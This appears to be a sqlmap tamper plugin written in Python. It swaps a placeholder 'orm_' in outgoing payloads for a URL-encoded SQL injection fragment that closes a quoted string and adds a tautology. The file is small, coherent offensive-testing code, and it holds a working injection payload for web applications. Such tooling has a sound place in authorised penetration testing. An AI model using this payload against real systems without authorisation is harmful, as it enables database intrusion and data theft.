#!/usr/bin/env python

from lib.core.enums import PRIORITY
from lib.core.settings import UNICODE_ENCODING
import time

__priority__ = PRIORITY.LOWEST

def dependencies():
	pass

def tamper(payload, **kwargs):

	if payload and 'orm_' in payload:
		orm_sql = "'%20and%201=1*%20and%20'1'='1"
		payload=payload.replace('orm_',orm_sql)
		# payload=payload.replace(' ',orm_sql)
		# time.sleep(1)

	return payload